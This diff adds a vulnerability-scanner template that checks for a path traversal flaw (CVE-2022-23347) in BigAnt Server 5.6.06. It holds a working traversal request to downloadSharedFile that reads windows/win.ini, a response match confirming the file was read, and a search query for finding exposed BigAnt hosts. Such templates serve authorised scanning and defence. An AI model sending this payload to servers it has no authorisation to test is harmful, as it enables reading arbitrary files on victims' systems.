@@ -1,0 +1,19 @@
+name: BigAnt Server v5.6.06 Path Traversal CVE-2022-23347
+manual: true
+query: title="BigAnt" || body="BigAnt"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini&file_name=win.ini
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"bit app support")
+      && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-23347
+  description: BigAnt is client/server application which provides enterprise instant
+    messaging solution.
+  tags: Path Traversal
